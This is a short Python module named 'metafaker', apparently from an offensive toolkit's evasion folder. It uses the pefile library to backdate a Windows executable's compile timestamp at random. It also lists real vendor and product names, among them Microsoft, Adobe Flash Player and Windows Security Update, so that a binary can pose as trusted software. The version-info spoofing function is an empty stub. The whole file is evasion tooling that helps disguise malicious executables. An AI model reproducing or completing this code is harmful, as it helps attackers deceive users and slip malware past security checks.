# modules/evasion/metafaker.py
import pefile
import os
from datetime import datetime, timedelta
import random

class MetaFaker:
    def __init__(self):
        self.fake_companies = [
            "Microsoft Corporation",
            "Adobe Systems Incorporated", 
            "Google LLC",
            "Oracle Corporation",
            "Intel Corporation"
        ]
        
        self.fake_products = [
            "Windows Security Update",
            "Adobe Flash Player",
            "Google Chrome Helper",
            "Oracle Java Runtime",
            "Intel Graphics Driver"
        ]
        
    def add_fake_metadata(self, pe_path):
        """Ajoute de fausses métadonnées légitimes"""
        try:
            pe = pefile.PE(pe_path)
            
            # Modification du timestamp (date récente mais pas trop)
            fake_date = datetime.now() - timedelta(days=random.randint(30, 365))
            pe.FILE_HEADER.TimeDateStamp = int(fake_date.timestamp())
            
            # Ajout de version info factice
            self._add_fake_version_info(pe)
            
            output_path = pe_path.replace('.exe', '_meta.exe')
            pe.write(output_path)
            pe.close()
            
            return output_path
            
        except Exception as e:
            print(f"Metadata spoofing failed: {e}")
            return pe_path
            
    def _add_fake_version_info(self, pe):
        """Ajoute des informations de version factices"""
        # Simulation d'ajout de version info
        # En pratique, nécessiterait une manipulation plus complexe des ressources PE
        pass
